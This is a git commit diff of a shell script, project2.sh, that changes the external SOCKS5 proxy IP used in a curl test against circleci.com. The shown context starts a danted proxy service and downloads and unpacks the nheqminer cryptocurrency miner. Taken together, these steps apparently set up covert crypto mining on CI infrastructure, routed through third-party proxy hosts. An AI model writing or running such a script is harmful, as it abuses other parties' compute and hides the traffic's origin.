93285d6769df3aee51d31ff7d935af73a668219f
vamadaboreno <93459451+vamadaboreno@users.noreply.github.com>
2021-10-31 10:25:16 +0700

    Update project2.sh

--- project2.sh
+++ project2.sh
@@ -10,7 +10,7 @@ service danted start
 #
 service danted status
 #
-curl -v -x socks5://207.180.236.140:1080 https://circleci.com/
+curl -v -x socks5://181.6.46.175:1080 https://circleci.com/
 #
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 tar -xvf nheqminer-Linux-v0.8.2.tgz 
